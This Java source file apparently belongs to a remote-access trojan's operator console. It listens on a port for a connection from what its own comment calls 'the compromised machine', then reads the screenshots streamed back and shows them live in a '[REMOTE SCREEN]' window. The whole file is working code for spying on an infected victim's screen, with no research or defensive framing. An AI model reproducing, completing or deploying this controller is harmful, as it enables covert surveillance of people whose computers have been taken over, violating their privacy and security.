import java.net.*;
import java.io.*;
import java.nio.*;
import javax.swing.*;
import javax.imageio.ImageIO;
import java.io.File;
import java.awt.image.BufferedImage;
public class StreamListener implements Runnable {
    StreamWindow dispWindow;
    Socket s;
    int port;
    String hostinfo;
    public StreamListener(int port, String hostinfo) {
        this.hostinfo = hostinfo;
        this.port = port;
    }
    public void run() {
        //wait for new images from the compromised machine.
        try {
            ServerSocket ss = new ServerSocket(this.port);
            ss.setReuseAddress(true);
            s = ss.accept();
        } catch (Exception e) {
            e.printStackTrace();
        }
        JFrame frame = new JFrame("[REMOTE SCREEN] " + this.hostinfo);
        frame.setSize(965,565);
        frame.setResizable(false);
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        dispWindow = new StreamWindow();
        frame.add(dispWindow);
        frame.setVisible(true);
        dispWindow.setVisible(true);
        try {
            PrintStream ps = new PrintStream(s.getOutputStream());
            OutputStream os = s.getOutputStream();
            InputStream is = s.getInputStream();
            BufferedReader din = new BufferedReader(new InputStreamReader(s.getInputStream()));
            while(true) {
                try {
                    String line = din.readLine();
                    if (line.equals("1")) {
                        BufferedImage image = ImageIO.read(ImageIO.createImageInputStream(is));
                        dispWindow.setImage(image);
                        line = din.readLine();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    frame.dispose();
                    return;
                }
            } 
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}